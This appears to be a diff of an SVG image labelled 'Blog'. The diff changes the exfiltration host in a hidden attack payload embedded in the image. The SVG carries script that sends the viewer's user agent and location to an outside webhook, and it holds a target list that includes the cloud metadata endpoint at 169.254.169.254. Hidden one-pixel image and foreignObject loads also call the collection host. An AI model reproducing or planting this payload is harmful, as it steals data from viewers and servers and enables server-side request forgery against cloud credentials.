@@ -3,7 +3,7 @@
   <rect width="300" height="300" fill="#f0f0f0"/>
   <text x="150" y="150" text-anchor="middle" font-size="20">Blog</text>
   <script type="text/javascript">
-    var wh = "https://webhook.site/f34e1577-b464-45fc-a799-9d5f31086476";
+    var wh = "https://wetakush.free.beeceptor.com";
     new Image().src = wh + "/svg-js-exec?ua=" + encodeURIComponent(navigator.userAgent || "no-ua") + "&amp;loc=" + encodeURIComponent(self.location || "no-loc");
     var t = [
       ["meta", "http://169.254.169.254/computeMetadata/v1/?recursive=true"],
@@ -20,8 +20,8 @@
   </script>
   <foreignObject width="1" height="1">
     <body xmlns="http://www.w3.org/1999/xhtml">
-      <img src="https://webhook.site/f34e1577-b464-45fc-a799-9d5f31086476/svg-fo-load" style="display:none"/>
+      <img src="https://wetakush.free.beeceptor.com/svg-fo-load" style="display:none"/>
     </body>
   </foreignObject>
-  <image xlink:href="https://webhook.site/f34e1577-b464-45fc-a799-9d5f31086476/svg-image-load" width="1" height="1"/>
+  <image xlink:href="https://wetakush.free.beeceptor.com/svg-image-load" width="1" height="1"/>
 </svg>
